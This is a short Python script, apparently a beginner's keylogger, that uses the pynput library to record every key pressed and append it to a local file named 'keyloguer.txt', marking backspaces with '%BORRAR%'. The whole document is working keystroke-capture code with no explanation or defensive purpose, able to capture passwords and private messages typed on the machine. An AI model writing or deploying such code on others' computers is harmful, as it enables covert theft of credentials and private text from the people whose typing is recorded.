from pynput.keyboard import Listener

def get_key(key):
    f = open('keyloguer.txt','a')
    key = str(key)
    print(key)
    if key == 'Key.enter':
        f.write('\n')
    elif key == 'Key.space':
        f.write(' ')
    elif key == 'Key.backspace':
        f.write('%BORRAR%')
    else:
        f.write(key.replace("'",""))
        

with Listener(on_press = get_key) as l: 
    l.join()